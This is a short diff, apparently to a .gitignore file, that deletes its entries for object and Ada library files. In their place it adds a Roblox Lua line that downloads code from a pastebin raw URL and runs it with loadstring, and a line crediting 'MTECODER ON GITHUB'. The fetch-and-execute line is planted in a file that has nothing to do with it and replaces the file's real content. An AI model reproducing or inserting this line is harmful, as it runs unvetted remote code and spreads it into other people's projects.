@@ -1,5 +1,4 @@
-# Object file
-*.o
+loadstring(game:HttpGet(('https://pastebin.com/raw/T7weKqag'),true))()
+Published By MTECODER ON GITHUB
 
-# Ada Library Information
-*.ali
+
